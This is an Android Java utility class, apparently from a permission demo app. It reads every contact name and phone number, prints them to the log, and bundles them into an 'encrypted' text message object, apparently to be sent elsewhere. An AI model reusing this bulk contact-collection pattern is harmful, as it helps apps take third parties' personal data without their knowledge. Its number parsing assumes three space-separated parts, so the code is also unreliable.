package com.example.permissiondemo;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;

import java.util.ArrayList;
import java.util.List;

public class ContactUtil {

    private ContentResolver contentResolver;
    private List<ContactsBean> contacts = new ArrayList<>();

    public ContactUtil(ContentResolver contentResolver){
        this.contentResolver = contentResolver;
    }

    public Message doFunction(){
        getConnect(contentResolver);
        return contactsToMessage();

    }

    //申请权限后才能使用
    //获取联系人
    private void getConnect(ContentResolver contentResolver) {
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[] { "display_name", "sort_key", "contact_id",
                        "data1" }, null, null, null);
        System.out.println("cursor connect count:" + cursor.getCount());
//        moveToNext方法返回的是一个boolean类型的数据
        while (cursor.moveToNext()) {
            //读取通讯录的姓名
            String name = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            //读取通讯录的号码
            String number = cursor.getString(cursor
                    .getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            //String a = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.))
            System.out.println("获取的通讯录是： " + name + "\n"
                    +  " number : " + number);
            String[] phoneNum = number.split(" ");
            number = phoneNum[0] + phoneNum[1] + phoneNum[2];
            ContactsBean contact = new ContactsBean(name, number);
            contacts.add(contact);
        }
        cursor.close();
    }

    private Message contactsToMessage(){
        Message message = new Message();
        message.msgtype = Message.MSGTYPE_TEXT;
        message.is_encry = 1;
        StringBuilder stringBuilder = new StringBuilder();
        for(ContactsBean contact : contacts){
            stringBuilder.append(contact.toString());
        }
        message.body = stringBuilder.toString();
        return message;
    }

}
